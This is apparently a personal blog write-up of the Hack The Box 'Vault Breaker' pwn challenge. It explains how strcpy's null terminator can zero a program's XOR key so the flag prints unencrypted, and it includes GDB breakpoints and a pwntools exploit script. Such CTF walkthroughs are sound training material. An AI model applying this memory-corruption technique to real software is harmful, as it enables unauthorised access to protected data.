---
layout: post
title:  Hack The Box - Vault Breaker
description: Vault Breaker pwn challenge
date: 2024-07-15
image: '/images/vault_breaker/Screenshot_2024-07-15.png'
image_caption: ''
tags: [htb, ctf, pwn, binexp, strcpy, easy]
---

This was a "very easy" challenge. That's relative, but it was *simple*.

With some GDB-fu and manual dynamic analysis we can reverse engineer a way to get the flag.

> TL;DR - Abuse strcpy to zero the program's XOR key. It will print the flag.

## The Program
The program's basic functionality is
1. Generate a random 32 byte key by reading `/dev/urandom`
2. Present the user with a menu
3. If the user enters `1`, we enter a key generation routine
    * Users control the length of the new key
    * The same place in memory is used, every time
    * After the routine we return to the original menu
4. If `2` is entered
    * the 32 bytes stored in memory is used to byte-wise XOR the flag
    * the result is printed
    * Any byte XOR'd with `0` is itself ;)

![XOR'd flag]({{site.baseURL}}/images/vault_breaker/Screenshot_2024-07-15_3.png)
*flag.txt "encrypted" with random bytes*

The vulnerability in this application is the use of `strcpy` to move random bytes
into the `random_key` memory.

According to [man pages](https://man7.org/linux/man-pages/man3/strcpy.3.html) for `man (3) strcpy`, the resulting string is null-terminated. We can abuse this behavior to zero the key used to XOR the flag. The trick is to zero the memory highest byte, first, because `strcpy` will overwrite previously written null bytes if we start from the lowest byte.

## Hints
1. The GDB command `x/32bx &random_key` shows the bytes used for the key. Watch it change as the program generates key keys of various lengths.
2. Set the key from the highest byte, first (31, 30, 29, ...)

![paused execution]({{site.baseUrl}}/images/vault_breaker/Screenshot_2024-07-15_2.png)
*execution while zero'ing xor key*

## Appendix I: Resources

GDB Command file (used with `-x`)

```bash
b *new_key_gen
b *secure_password + 410
commands 1
x/32bx &random_key
end
```

Script main

```python
io = start()

i = 31

input("\n[Press ENTER to start]\n")
while i >= 0:
    io.info(f"zeroing random_key[{i:02d}]")
    io.readuntil(b'> ')
    io.sendline(b'1')
    io.readuntil(b': ')
    i_string = str(i).encode('utf-8')
    io.sendline(i_string)
    i -= 1

io.readuntil(b'> ')
io.sendline(b'2')
io.readuntil(b'Vault: ')

flag = io.readall().decode()
```

<div class="gallery-box">
  <div class="gallery">
    <img src="/images/earth_orbit.jpg" loading="lazy" alt="void">
  </div>
  <em>Photo from <a href="https://unsplash.com/" target="_blank">Unsplash</a></em>
</div>
